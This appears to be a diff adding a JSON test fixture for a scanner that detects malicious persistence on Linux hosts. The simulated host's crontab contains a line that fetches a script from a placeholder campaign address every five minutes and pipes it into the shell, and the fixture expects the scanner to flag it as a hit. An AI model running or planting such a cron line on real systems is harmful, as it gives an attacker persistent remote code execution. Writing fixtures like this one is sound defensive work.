@@ -1,0 +1,27 @@
+{
+  "why": "A crontab line that calls a campaign address has no innocent reading. The shell left every non-empty crontab at review while calling the same content in a cron.d file or a unit a hit; this is that inconsistency settled in favour of the hit.",
+  "roots": [
+    "code"
+  ],
+  "files": {
+    "code/proj/src/index.js": "export const hello = () => 'world'\n"
+  },
+  "home": {},
+  "host": {
+    "platform": "linux\n",
+    "processes": "",
+    "connections": "",
+    "crontab": "*/5 * * * * curl -s http://{{NETIP}}/u | sh\n",
+    "git-config": "",
+    "root/.keep": ""
+  },
+  "expect": {
+    "exit": 2,
+    "findings": [
+      {
+        "level": "HIT",
+        "match": "user crontab contains an indicator"
+      }
+    ]
+  }
+}
